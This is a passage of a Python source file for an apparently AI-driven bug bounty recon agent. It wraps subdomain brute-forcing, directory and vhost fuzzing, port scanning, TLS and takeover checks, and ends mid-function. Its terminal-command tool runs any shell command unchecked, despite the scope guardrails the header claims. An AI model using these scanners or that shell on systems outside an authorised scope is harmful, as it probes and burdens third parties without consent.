"""
hellhound/core/agent.py

Autonomous Bug Bounty Reconnaissance & Triage Agent.
Coordinates discovery tools, enforces code-level scope guardrails,
manages target task context, and triages verified findings.
"""

from dataclasses import dataclass, field
import base64
import hashlib
import hmac
import json
import logging
import os
from pathlib import Path
import re
import shutil
import subprocess
from typing import Dict, Any, List, Optional, Callable, Tuple
from urllib.parse import urlparse

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from hellhound.core.scope import ScopeRules, is_in_scope, check_module_against_rules
from hellhound.core.tasks import Target, create_or_load_target, save_target, set_scope, sanitize_target_name
from hellhound.core.guard import AutopilotGuard
from hellhound.core.ai_utils import (
    load_config,
    call_ai,
    ask_neural_core,
    thinking_animation,
    render_chat_bubble,
)
from hellhound.core.http_utils import merge_global_context
from hellhound.memory import (
    build_investigation_summary,
    update_from_subfinder,
    update_from_httpx,
    update_from_spider,
    update_from_subzy,
    update_from_bac,
    update_from_gowitness,
    record_evidence_card,
)
from hellhound.core.skills import (
    get_relevant_skills_prompt,
    discover_skills,
    search_skills,
    load_skill_body,
    is_ctf_lab_context,
    is_ctf_auto_scope_eligible,
)
from hellhound.core.toolcheck import ensure_tool, get_binary_path, is_available


def _load_baseline_rules() -> str:
    """Load always-on baseline doctrine rules from core baseline_rules.md."""
    rules_file = Path(__file__).resolve().parent / "baseline_rules.md"
    if rules_file.exists():
        try:
            return rules_file.read_text(encoding="utf-8").strip()
        except Exception:
            pass
    return (
        "BASELINE DOCTRINE:\n"
        "1. Verify target scope before network actions.\n"
        "2. Reconnaissance & factual triage only — non-destructive, no exploitation.\n"
        "3. Never record theoretical bugs; require concrete reproducible evidence.\n"
        "4. Qualify dead attack surfaces quickly."
    )


BASELINE_RULES_PROMPT = _load_baseline_rules()


logger = logging.getLogger("hellhound.agent")


# ==========================================================
# TOOL DEFINITIONS & SPECIFICATIONS
# ==========================================================

@dataclass
class ToolSpec:
    name: str
    description: str
    parameters: Dict[str, Any]
    executor: Callable[[Dict[str, Any], Target, Any], Dict[str, Any]]


# ==========================================================
# TOOL EXECUTORS (RECON & TRIAGE ONLY)
# ==========================================================

def _find_binary(name: str) -> Optional[str]:
    """Find binary in system PATH as well as standard user Go binary directories."""
    return get_binary_path(name)


def _resolve_resolvers_path() -> str:
    """Resolve DNS resolvers file, checking fast local list, tool configs, standard SecLists paths, or generating default public resolvers."""
    repo_root = Path(__file__).resolve().parent.parent
    candidates = [
        str(repo_root / "wordlists" / "dns" / "resolvers-fast.txt"),
        "/usr/share/wordlists/seclists/Miscellaneous/dns-resolvers.txt",
        "/usr/share/seclists/Miscellaneous/dns-resolvers.txt",
        str(Path.home() / "HACK-HUB" / "bug-hunting" / "Tools" / "resolvers.txt"),
        str(Path.home() / ".config" / "subfinder" / "resolvers.txt"),
        str(Path.home() / ".config" / "dnsx" / "resolvers.txt"),
        str(Path.home() / ".hellhound" / "resolvers.txt")
    ]
    for c in candidates:
        if os.path.exists(c) and os.path.getsize(c) > 0:
            return c
    default_res = Path.home() / ".hellhound" / "resolvers.txt"
    default_res.parent.mkdir(parents=True, exist_ok=True)
    if not default_res.exists() or default_res.stat().st_size == 0:
        default_res.write_text("1.1.1.1\n8.8.8.8\n9.9.9.9\n8.8.4.4\n1.0.0.1\n")
    return str(default_res)


def _execute_shuffledns(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Active DNS brute-force via shuffledns (massdns-backed) with wildcard handling."""
    domain = (args.get("domain") or target.name).strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("shuffledns", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "shuffledns not installed",
            "message": check["message"],
            "hint": "pdtm -i shuffledns"
        }

    binary = get_binary_path("shuffledns") or "shuffledns"

    # Resolve wordlist path (prioritize SecLists / Kali system wordlists, fallback to curated fast list)
    repo_root = Path(__file__).resolve().parent.parent
    wordlist_candidates = [
        Path("/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
        Path("/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
        Path("/usr/share/wordlists/seclists/Discovery/DNS/namelist.txt"),
        Path("/usr/share/seclists/Discovery/DNS/namelist.txt"),
        Path("/usr/share/wordlists/amass/subdomains.lst"),
        repo_root / "wordlists" / "dns" / "subdomains-fast.txt"
    ]
    wordlist = None
    for wc in wordlist_candidates:
        if wc.exists() and wc.stat().st_size > 0:
            wordlist = str(wc)
            break

    if not wordlist:
        return {"error": "No DNS wordlist found in repository or standard SecLists paths."}

    resolvers = _resolve_resolvers_path()
    massdns_bin = _find_binary("massdns") or "/usr/bin/massdns"

    cmd = [binary, "-d", domain, "-w", wordlist, "-r", resolvers, "-mode", "bruteforce", "-silent"]
    if os.path.exists(massdns_bin):
        cmd.extend(["-m", massdns_bin])

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        subdomains = [l.strip().lower() for l in proc.stdout.splitlines() if l.strip() and "." in l]
    except Exception as e:
        return {"error": f"shuffledns execution failed: {e}", "domain": domain}

    # Update target state
    if "subdomains" not in target.state:
        target.state["subdomains"] = []
    for s in subdomains:
        if s not in target.state["subdomains"]:
            target.state["subdomains"].append(s)

    return {
        "domain": domain,
        "count": len(subdomains),
        "subdomains": subdomains[:100],
        "total_discovered": len(subdomains)
    }


def _execute_ffuf_vhost(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Virtual-host fuzzing via ffuf to discover vhosts sharing an IP or host."""
    domain = args.get("domain", "").strip().lower() or target.name
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]

    target_ip = args.get("target_ip", "").strip() or domain
    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("ffuf", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "ffuf not installed",
            "message": check["message"],
            "hint": "go install github.com/ffuf/ffuf/v2@latest"
        }

    binary = get_binary_path("ffuf") or "ffuf"

    repo_root = Path(__file__).resolve().parent.parent
    wordlist_candidates = [
        repo_root / "wordlists" / "vhosts" / "vhosts.txt",
        Path("/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")
    ]
    wordlist = None
    for wc in wordlist_candidates:
        if wc.exists() and wc.stat().st_size > 0:
            wordlist = str(wc)
            break

    if not wordlist:
        return {"error": "No vhost wordlist found."}

    target_url = target_ip if target_ip.startswith(("http://", "https://")) else f"http://{target_ip}"
    cmd = [
        binary,
        "-w", wordlist,
        "-u", target_url,
        "-H", f"Host: FUZZ.{domain}",
        "-mc", "200,301,302,403",
        "-of", "json",
        "-o", "-",
        "-s"
    ]

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        results = []
        if proc.stdout.strip():
            data = json.loads(proc.stdout)
            raw_res = data.get("results", [])
            for r in raw_res:
                vhost = r.get("input", {}).get("FUZZ", "")
                status = r.get("status", 0)
                length = r.get("length", 0)
                full_host = f"{vhost}.{domain}" if vhost else ""
                results.append({
                    "host": full_host,
                    "status": status,
                    "length": length
                })
    except Exception as e:
        results = []

    return {
        "domain": domain,
        "target": target_url,
        "vhosts_found": results,
        "count": len(results)
    }


def _execute_ffuf_content(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Content & directory fuzzing via ffuf."""
    import tempfile
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("ffuf", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "ffuf not installed",
            "message": check["message"],
            "hint": "go install github.com/ffuf/ffuf/v2@latest"
        }

    binary = get_binary_path("ffuf") or "ffuf"

    repo_root = Path(__file__).resolve().parent.parent
    wordlist_candidates = [
        repo_root / "wordlists" / "web" / "directories-fast.txt",
        Path("/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"),
        Path("/usr/share/seclists/Discovery/Web-Content/common.txt"),
        Path("/usr/share/wordlists/dirb/common.txt"),
        Path("/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt")
    ]
    wordlist = None
    for wc in wordlist_candidates:
        if wc.exists() and wc.stat().st_size > 0:
            wordlist = str(wc)
            break

    if not wordlist:
        return {"error": "No directory wordlist found."}

    target_url = url.rstrip("/") + "/FUZZ"
    temp_json = None
    try:
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
            temp_json = tf.name
    except Exception:
        temp_json = None

    cmd = [
        binary,
        "-w", wordlist,
        "-u", target_url,
        "-mc", "200,204,301,302,307,401,403,405",
        "-t", "40",
        "-timeout", "5",
        "-s"
    ]

    if temp_json:
        cmd.extend(["-of", "json", "-o", temp_json])

    # Pass authenticated headers/cookies if available
    req_headers = args.get("headers") or {}
    if not req_headers and hasattr(target, "state") and isinstance(target.state, dict):
        req_headers = target.state.get("headers", {})
    if isinstance(req_headers, dict):
        for hk, hv in req_headers.items():
            if isinstance(hv, str) and hv.strip():
                cmd.extend(["-H", f"{hk}: {hv.strip()}"])

    # Pass cookies
    req_cookies = args.get("cookies") or {}
    if not req_cookies and hasattr(target, "state") and isinstance(target.state, dict):
        req_cookies = target.state.get("cookies", {})
    if req_cookies and isinstance(req_cookies, dict):
        cookie_str = "; ".join(f"{k}={v}" for k, v in req_cookies.items())
        cmd.extend(["-H", f"Cookie: {cookie_str}"])

    results = []
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        
        # Read structured JSON output from tempfile
        if temp_json and os.path.exists(temp_json) and os.path.getsize(temp_json) > 0:
            with open(temp_json, "r", encoding="utf-8", errors="ignore") as f:
                data = json.load(f)
                raw_res = data.get("results", [])
                for r in raw_res:
                    path = r.get("input", {}).get("FUZZ", "")
                    status = r.get("status", 0)
                    length = r.get("length", 0)
                    redirect = r.get("redirectlocation", "")
                    hit_url = r.get("url", f"{url.rstrip('/')}/{path}")
                    results.append({
                        "url": hit_url,
                        "path": path,
                        "status": status,
                        "length": length,
                        "redirect": redirect
                    })
        elif proc.stdout.strip():
            # Fallback: parse raw lines from stdout
            for line in proc.stdout.strip().splitlines():
                line_clean = line.strip()
                if line_clean and not line_clean.startswith("[") and not line_clean.startswith("::"):
                    results.append({
                        "url": f"{url.rstrip('/')}/{line_clean}",
                        "path": line_clean,
                        "status": 200,
                        "length": 0
                    })
    except Exception as e:
        results = []
    finally:
        if temp_json and os.path.exists(temp_json):
            try:
                os.remove(temp_json)
            except Exception:
                pass

    paths = [r["path"] for r in results]

    # Automatically register discovered endpoints in target state
    if hasattr(target, "state") and isinstance(target.state, dict):
        if "endpoints" not in target.state or not isinstance(target.state["endpoints"], list):
            target.state["endpoints"] = []
        for r in results:
            hit_url = r.get("url")
            if hit_url and hit_url not in target.state["endpoints"]:
                target.state["endpoints"].append(hit_url)
        save_target(target)

    return {
        "target_url": url,
        "paths": paths,
        "discovered_endpoints": results[:100],
        "count": len(results)
    }


def _execute_terminal_command(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Execute a custom terminal command/Kali tool targeting a specified host/IP."""
    command = args.get("command", "").strip()
    target_host = args.get("target", "").strip()

    if not command:
        return {"error": "No command specified."}

    try:
        import subprocess
        # 180s timeout to prevent locking execution loops
        proc = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=180
        )
        return {
            "command": command,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
            "exit_code": proc.returncode
        }
    except subprocess.TimeoutExpired:
        return {
            "command": command,
            "error": "Command execution timed out after 180 seconds."
        }
    except Exception as e:
        return {
            "command": command,
            "error": f"Failed to execute command: {e}"
        }


def _execute_subfinder(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    domain = args.get("domain") or target.name
    domain = domain.strip().lower()
    if domain.startswith("http://") or domain.startswith("https://"):
        domain = urlparse(domain).netloc.split(":")[0]

    # Fast skip for CTF / Lab targets (unindexed private environments)
    from hellhound.core.skills import is_ctf_domain_pattern, is_ctf_auto_scope_eligible
    if is_ctf_domain_pattern(domain) or is_ctf_auto_scope_eligible(target.name):
        if emit and hasattr(emit, "info"):
            emit.info(f"[*] Skipping passive subfinder for CTF/lab target '{domain}' (unindexed). Using active enumeration.")
        return {
            "domain": domain,
            "count": 0,
            "subdomains": [],
            "total_discovered": 0,
            "note": "Skipped passive OSINT (subfinder) on CTF/lab target. Subdomains in private labs are not in public CT logs. Active dns_bruteforce or httpx should be used instead."
        }

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("subfinder", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "subfinder not installed",
            "message": check["message"],
            "hint": "pdtm -i subfinder"
        }

    subfinder_bin = get_binary_path("subfinder") or "subfinder"
    subdomains = set()

    try:
        cmd = [subfinder_bin, "-d", domain, "-silent", "-all"]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if proc.returncode == 0:
            for line in proc.stdout.splitlines():
                sub = line.strip().lower()
                if sub and "." in sub:
                    subdomains.add(sub)
    except Exception as e:
        logger.warning(f"subfinder execution failed: {e}")

    sub_list = sorted(list(subdomains))
    # Update target state and investigation memory
    try:
        update_from_subfinder(target, sub_list)
        save_target(target)
    except Exception:
        if "subdomains" not in target.state:
            target.state["subdomains"] = []
        for s in sub_list:
            if s not in target.state["subdomains"]:
                target.state["subdomains"].append(s)

    return {
        "domain": domain,
        "count": len(sub_list),
        "subdomains": sub_list[:100],  # Return up to 100 in context
        "total_discovered": len(sub_list)
    }


def _execute_port_scan(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Port scanning via naabu to discover open TCP/UDP ports and non-standard web services."""
    raw_target = args.get("hosts") or args.get("target") or args.get("host") or target.name
    targets_to_scan = []
    if isinstance(raw_target, list):
        targets_to_scan = [str(t).strip() for t in raw_target if str(t).strip()]
    elif isinstance(raw_target, str) and "," in raw_target:
        targets_to_scan = [t.strip() for t in raw_target.split(",") if t.strip()]
    else:
        targets_to_scan = [str(raw_target).strip()]

    cleaned_targets = []
    for t in targets_to_scan:
        if t.startswith(("http://", "https://")):
            t = urlparse(t).netloc.split(":")[0]
        if t:
            cleaned_targets.append(t)

    if not cleaned_targets:
        return {"error": "No valid hosts provided for port scan."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("naabu", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "naabu not installed",
            "message": check["message"],
            "hint": "pdtm -i naabu"
        }

    binary = get_binary_path("naabu") or "naabu"

    ports = str(args.get("ports", "top-100")).strip().lower()
    exclude_ports = args.get("exclude_ports")

    cmd = [binary, "-j", "-silent"]
    if ports in ("top-100", "top100", "100"):
        cmd.extend(["-tp", "100"])
    elif ports in ("top-1000", "top1000", "1000"):
        cmd.extend(["-tp", "1000"])
    elif ports in ("full", "all", "top-full"):
        cmd.extend(["-tp", "full"])
    else:
        cmd.extend(["-p", ports])

    if exclude_ports:
        cmd.extend(["-exclude-ports", str(exclude_ports)])

    open_ports = []
    try:
        input_data = "\n".join(cleaned_targets)
        proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=120)
        if proc.stdout.strip():
            for line in proc.stdout.splitlines():
                if line.strip():
                    try:
                        item = json.loads(line.strip())
                        open_ports.append({
                            "host": item.get("host"),
                            "ip": item.get("ip", ""),
                            "port": item.get("port"),
                            "protocol": item.get("protocol", "tcp"),
                            "tls": item.get("tls", False)
                        })
                    except Exception:
                        pass
    except Exception as e:
        return {"error": f"naabu execution failed: {e}", "hosts": cleaned_targets}

    # Update target state
    if "open_ports" not in target.state:
        target.state["open_ports"] = []
    for p in open_ports:
        if p not in target.state["open_ports"]:
            target.state["open_ports"].append(p)

    return {
        "hosts_scanned": cleaned_targets,
        "count": len(open_ports),
        "open_ports": open_ports
    }


def _execute_permute_subdomains(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Generate subdomain wordlist mutations and permutations using alterx."""
    raw_subdomains = args.get("subdomains") or args.get("domains") or target.state.get("subdomains") or [target.name]
    if isinstance(raw_subdomains, list):
        sub_list = [str(s).strip().lower() for s in raw_subdomains if str(s).strip()]
    elif isinstance(raw_subdomains, str) and "," in raw_subdomains:
        sub_list = [s.strip().lower() for s in raw_subdomains.split(",") if s.strip()]
    else:
        sub_list = [str(raw_subdomains).strip().lower()]

    cleaned = []
    for s in sub_list:
        if s.startswith(("http://", "https://")):
            s = urlparse(s).netloc.split(":")[0]
        if s:
            cleaned.append(s)

    if not cleaned:
        return {"error": "No subdomains provided for permutation generation."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("alterx", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "alterx not installed",
            "message": check["message"],
            "hint": "pdtm -i alterx"
        }

    binary = get_binary_path("alterx") or "alterx"

    limit = int(args.get("limit", 500))
    cmd = [binary, "-silent", "-limit", str(limit)]

    candidates = []
    try:
        input_data = "\n".join(cleaned)
        proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=60)
        candidates = [l.strip().lower() for l in proc.stdout.splitlines() if l.strip() and "." in l]
    except Exception as e:
        return {"error": f"alterx execution failed: {e}"}

    return {
        "count": len(candidates),
        "candidates": candidates[:100],  # Return first 100 in context
        "total_generated": len(candidates)
    }


def _execute_resolve_candidates(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Bulk-resolve and filter candidate domain names using dnsx."""
    raw_candidates = args.get("candidates") or args.get("domains") or args.get("subdomains")
    if isinstance(raw_candidates, list):
        cand_list = [str(c).strip().lower() for c in raw_candidates if str(c).strip()]
    elif isinstance(raw_candidates, str) and "," in raw_candidates:
        cand_list = [c.strip().lower() for c in raw_candidates.split(",") if c.strip()]
    elif isinstance(raw_candidates, str) and raw_candidates.strip():
        cand_list = [raw_candidates.strip().lower()]
    else:
        cand_list = target.state.get("subdomains", [target.name])

    cleaned = []
    for c in cand_list:
        if c.startswith(("http://", "https://")):
            c = urlparse(c).netloc.split(":")[0]
        if c:
            cleaned.append(c)

    if not cleaned:
        return {"error": "No candidate domains provided for resolution."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("dnsx", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "dnsx not installed",
            "message": check["message"],
            "hint": "pdtm -i dnsx"
        }

    binary = get_binary_path("dnsx") or "dnsx"

    import tempfile
    with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
        f.write("\n".join(cleaned) + "\n")
        tmp_path = f.name

    resolved = []
    try:
        resolvers = _resolve_resolvers_path()
        cmd = [binary, "-l", tmp_path, "-silent", "-json", "-a", "-cname", "-resp"]
        if resolvers and os.path.exists(resolvers):
            cmd.extend(["-r", resolvers])

        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        if proc.stdout.strip():
            for line in proc.stdout.splitlines():
                if line.strip():
                    try:
                        item = json.loads(line.strip())
                        host = item.get("host")
                        if host:
                            resolved.append({
                                "host": host,
                                "a": item.get("a", []),
                                "cname": item.get("cname", []),
                                "status_code": item.get("status_code", "NOERROR")
                            })
                    except Exception:
                        pass
    except Exception as e:
        return {"error": f"dnsx resolution failed: {e}"}
    finally:
        if os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass

    # Update target state
    if "subdomains" not in target.state:
        target.state["subdomains"] = []
    for r in resolved:
        h = r["host"]
        if h not in target.state["subdomains"]:
            target.state["subdomains"].append(h)

    return {
        "count": len(resolved),
        "resolved": resolved[:100],
        "total_resolved": len(resolved)
    }


def _execute_tls_cert_scan(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Scan and parse TLS/SSL certificate SANs and CNs using tlsx to discover related infrastructure."""
    raw_target = args.get("hosts") or args.get("target") or args.get("domains") or target.name
    targets_to_scan = []
    if isinstance(raw_target, list):
        targets_to_scan = [str(t).strip() for t in raw_target if str(t).strip()]
    elif isinstance(raw_target, str) and "," in raw_target:
        targets_to_scan = [t.strip() for t in raw_target.split(",") if t.strip()]
    else:
        targets_to_scan = [str(raw_target).strip()]

    cleaned_targets = []
    for t in targets_to_scan:
        if t.startswith(("http://", "https://")):
            t = urlparse(t).netloc.split(":")[0]
        if t:
            cleaned_targets.append(t)

    if not cleaned_targets:
        return {"error": "No valid hosts provided for TLS certificate scan."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("tlsx", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "tlsx not installed",
            "message": check["message"],
            "hint": "pdtm -i tlsx"
        }

    binary = get_binary_path("tlsx") or "tlsx"

    port = str(args.get("port", "443")).strip()
    cmd = [binary, "-san", "-cn", "-so", "-silent", "-json", "-p", port]

    results = []
    discovered_sans = set()
    try:
        input_data = "\n".join(cleaned_targets)
        proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=60)
        if proc.stdout.strip():
            for line in proc.stdout.splitlines():
                if line.strip():
                    try:
                        item = json.loads(line.strip())
                        host = item.get("host")
                        cn = item.get("subject_cn", "")
                        sans = item.get("subject_an", [])
                        results.append({
                            "host": host,
                            "ip": item.get("ip", ""),
                            "subject_cn": cn,
                            "subject_an": sans,
                            "issuer_org": item.get("issuer_org", []),
                            "tls_version": item.get("tls_version", ""),
                            "wildcard": item.get("wildcard_certificate", False)
                        })
                        if cn and "." in cn and not cn.startswith("*"):
                            discovered_sans.add(cn.lower())
                        for s in sans:
                            clean_s = s.lower().lstrip("*.")
                            if clean_s and "." in clean_s:
                                discovered_sans.add(clean_s)
                    except Exception:
                        pass
    except Exception as e:
        return {"error": f"tlsx execution failed: {e}", "hosts": cleaned_targets}

    # Update target state with discovered SAN names matching root domain if available
    san_list = sorted(list(discovered_sans))
    if "subdomains" not in target.state:
        target.state["subdomains"] = []
    for s in san_list:
        if target.name in s and s not in target.state["subdomains"]:
            target.state["subdomains"].append(s)

    return {
        "hosts_scanned": cleaned_targets,
        "count": len(results),
        "certificates": results,
        "discovered_domains": san_list[:50]
    }


def _execute_httpx(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    raw_target = args.get("target") or target.name
    targets_to_probe = []
    if isinstance(raw_target, list):
        targets_to_probe = raw_target
    else:
        targets_to_probe = [raw_target]

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("httpx", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])

    live_hosts = []

    # 1. Try local httpx binary if available
    httpx_bin = get_binary_path("httpx") if check["available"] else None
    if httpx_bin:
        try:
            input_data = "\n".join(targets_to_probe)
            cmd = [httpx_bin, "-silent", "-status-code", "-title", "-tech-detect", "-cl", "-location", "-json"]
            proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=60)
            if proc.returncode == 0:
                for line in proc.stdout.splitlines():
                    if line.strip():
                        try:
                            item = json.loads(line.strip())
                            live_hosts.append({
                                "url": item.get("url"),
                                "status_code": item.get("status_code"),
                                "title": item.get("title", ""),
                                "tech": item.get("tech", []),
                                "webserver": item.get("webserver", ""),
                                "content_length": item.get("content_length"),
                                "location": item.get("location", "")
                            })
                        except Exception:
                            pass
        except Exception as e:
            logger.warning(f"httpx binary failed: {e}")

    # 2. Fallback to lightweight HTTP probe (runs if binary unavailable or returned no hosts)
    if not live_hosts:
        for t in targets_to_probe[:20]:
            host = t.strip()
            if not host.startswith(("http://", "https://")):
                urls = [f"https://{host}", f"http://{host}"]
            else:
                urls = [host]
            for u in urls:
                try:
                    r = requests.get(u, timeout=5, verify=False, allow_redirects=True, headers=merge_global_context({}))
                    live_hosts.append({
                        "url": u,
                        "status_code": r.status_code,
                        "title": re.search(r'<title>(.*?)</title>', r.text, re.I).group(1).strip() if re.search(r'<title>(.*?)</title>', r.text, re.I) else "",
                        "tech": [r.headers.get("Server")] if r.headers.get("Server") else [],
                        "webserver": r.headers.get("Server", ""),
                        "content_length": len(r.content) if r.content is not None else 0,
                        "location": r.headers.get("Location", "")
                    })
                    break
                except Exception:
                    continue

    # Update target state and investigation memory
    try:
        live_urls = [h.get("url") for h in live_hosts if isinstance(h, dict) and h.get("url")]
        all_techs = []
        for h in live_hosts:
            if isinstance(h, dict):
                for t in h.get("tech", []):
                    if t and t not in all_techs:
                        all_techs.append(t)
        update_from_httpx(target, live_urls, all_techs)
        save_target(target)
    except Exception:
        if "live_hosts" not in target.state:
            target.state["live_hosts"] = []
        for h in live_hosts:
            if h not in target.state["live_hosts"]:
                target.state["live_hosts"].append(h)

    return {
        "count": len(live_hosts),
        "live_hosts": live_hosts
    }


def _execute_subzy(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Subdomain takeover verification (DNS CNAME + Signature response check)."""
    subdomain = args.get("subdomain") or target.name
    subdomain = subdomain.strip().lower()
    if subdomain.startswith(("http://", "https://")):
        subdomain = urlparse(subdomain).netloc.split(":")[0]

    # Signatures of dangling CNAME services
    TAKEOVER_SIGNATURES = {
        "github": ("github.io", "There isn't a GitHub Pages site here."),
        "aws_s3": ("s3.amazonaws.com", "The specified bucket does not exist"),
        "heroku": ("herokudns.com", "No such app"),
        "shopify": ("myshopify.com", "Sorry, this shop is currently unavailable"),
        "fastly": ("fastly.net", "Fastly error: unknown domain"),
        "azure": ("azurewebsites.net", "404 Web Site not found"),
        "tumblr": ("tumblr.com", "Whatever you were looking for doesn't seem to exist"),
        "wordpress": ("wordpress.com", "Do you want to register"),
        "ghost": ("ghost.io", "The thing you were looking for is gone"),
    }

    cname_found = None
    vulnerable = False
    service_matched = None
    fingerprint = ""

    # Check DNS CNAME record
    try:
        cmd = ["dig", "+short", "CNAME", subdomain]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if proc.returncode == 0 and proc.stdout.strip():
            cname_found = proc.stdout.strip().rstrip('.')
    except Exception:
        pass

    if cname_found:
        for s_name, (s_cname_pattern, s_sig) in TAKEOVER_SIGNATURES.items():
            if s_cname_pattern in cname_found:
                service_matched = s_name
                # Check HTTP response body for signature
                try:
                    r = requests.get(f"http://{subdomain}", timeout=6, verify=False)
                    if s_sig in r.text:
                        vulnerable = True
                        fingerprint = s_sig
                except Exception:
                    pass
                break

    result = {
        "subdomain": subdomain,
        "cname": cname_found or "None",
        "service": service_matched or "Unknown",
        "takeover_candidate": vulnerable,
        "evidence": fingerprint if vulnerable else ("CNAME resolved to " + (cname_found or "none"))
    }

    if vulnerable:
        finding = {
            "type": "Subdomain Takeover Candidate",
            "target": subdomain,
            "cname": cname_found,
            "service": service_matched,
            "severity": "HIGH",
            "verified": True
        }
        if finding not in target.findings:
            target.findings.append(finding)
        try:
            update_from_subzy(target, [subdomain])
        except Exception:
            pass
        save_target(target)

    return result


def _execute_takeover_scanner(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Scan subdomains for takeover vulnerabilities using subjack and signature grep."""
    subdomains = args.get("subdomains")
    if not subdomains:
        subdomains = target.state.get("subdomains", [])
    
    if not subdomains:
        return {"error": "No subdomains found to scan."}

    # Write subdomains to a temp file in target's directory
    sub_file = Path(target.dir) / "takeover_subs_temp.txt"
    try:
        with open(sub_file, "w", encoding="utf-8") as f:
            for s in subdomains:
                f.write(f"{s}\n")
    except Exception as e:
        return {"error": f"Failed to write temporary subdomains file: {e}"}

    script_path = Path(__file__).resolve().parent.parent / "tools" / "takeover_scanner.sh"
    if not script_path.exists():
        return {"error": f"takeover_scanner.sh not found at {script_path}"}

    out_dir = Path(target.dir) / "takeover"
    out_dir.mkdir(parents=True, exist_ok=True)
    results_json = out_dir / "results.json"
    if results_json.exists():
        results_json.unlink()

    env = os.environ.copy()
    env["TAKEOVER_OUT_DIR"] = str(out_dir)

    try:
        cmd = [str(script_path), str(sub_file)]
        proc = subprocess.run(cmd, capture_output=True, text=True, env=env, timeout=180)
        
        # Parse JSON output
        results = []
        if results_json.exists():
            with open(results_json, "r", encoding="utf-8") as f:
                content = f.read().strip()
                if content:
                    results = json.loads(content)
    except Exception as e:
        results = []
        return {"error": f"takeover_scanner execution failed: {e}"}
    finally:
        if sub_file.exists():
            sub_file.unlink()

    # Process and verify candidates
    takeovers_found = []
    for entry in results:
        if isinstance(entry, dict) and entry.get("vulnerable"):
            takeovers_found.append(entry)
            finding = {
                "type": "Subdomain Takeover Candidate",
                "target": entry["subdomain"],
                "cname": entry.get("cname", "None"),
                "service": entry.get("service", "Unknown"),
                "severity": "HIGH",
                "verified": True
            }
            if finding not in target.findings:
                target.findings.append(finding)
    
    if takeovers_found:
        save_target(target)

    return {
        "scanned_count": len(subdomains),
        "takeovers_found": takeovers_found,
        "count": len(takeovers_found)
    }


def _execute_hackerone_search(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Search HackerOne Hacktivity for disclosed vulnerability reports."""
    keyword = args.get("keyword", "")
    program = args.get("program", "")
    limit = args.get("limit", 10)
    
    try:
